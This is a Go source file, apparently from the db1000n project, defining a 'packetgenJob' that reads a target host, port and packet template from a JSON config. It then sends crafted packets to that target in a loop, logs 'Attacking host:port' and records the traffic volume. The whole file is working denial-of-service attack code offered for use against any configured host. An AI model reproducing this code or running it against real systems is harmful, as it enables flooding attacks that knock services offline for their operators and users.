package jobs

import (
	"context"
	"encoding/json"
	"strconv"
	"time"

	"github.com/google/uuid"

	"github.com/Arriven/db1000n/src/logs"
	"github.com/Arriven/db1000n/src/metrics"
	"github.com/Arriven/db1000n/src/packetgen"
	"github.com/Arriven/db1000n/src/utils"
	"github.com/Arriven/db1000n/src/utils/templates"
)

func packetgenJob(ctx context.Context, l *logs.Logger, args Args) error {
	defer utils.PanicHandler()
	type packetgenJobConfig struct {
		BasicJobConfig
		Packet json.RawMessage
		Host   string
		Port   string
	}
	var jobConfig packetgenJobConfig
	err := json.Unmarshal(args, &jobConfig)
	if err != nil {
		l.Error("error parsing json: %v", err)
		return err
	}

	host := templates.Execute(jobConfig.Host)
	port, err := strconv.Atoi(templates.Execute(jobConfig.Port))
	if err != nil {
		l.Error("error parsing port: %v", err)
		return err
	}

	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	trafficMonitor := metrics.Default.NewWriter(ctx, "traffic", uuid.New().String())

	for jobConfig.Next(ctx) {
		select {
		case <-ticker.C:
			l.Info("Attacking %v:%v", jobConfig.Host, jobConfig.Port)
		default:
		}

		packetConfigBytes := []byte(templates.Execute(string(jobConfig.Packet)))
		l.Debug("[packetgen] parsed packet config template:\n%s", string(packetConfigBytes))
		var packetConfig packetgen.PacketConfig
		err := json.Unmarshal(packetConfigBytes, &packetConfig)
		if err != nil {
			l.Error("error parsing json: %v", err)
			return err
		}
		packetConfigBytes, err = json.Marshal(packetConfig)
		if err != nil {
			l.Error("error marshaling back to json: %v", err)
			return err
		}
		l.Debug("[packetgen] parsed packet config:\n%v", string(packetConfigBytes))
		len, err := packetgen.SendPacket(packetConfig, host, port)
		if err != nil {
			l.Error("error sending packet: %v", err)
			return err
		}
		trafficMonitor.Add(len)
	}
	return nil
}
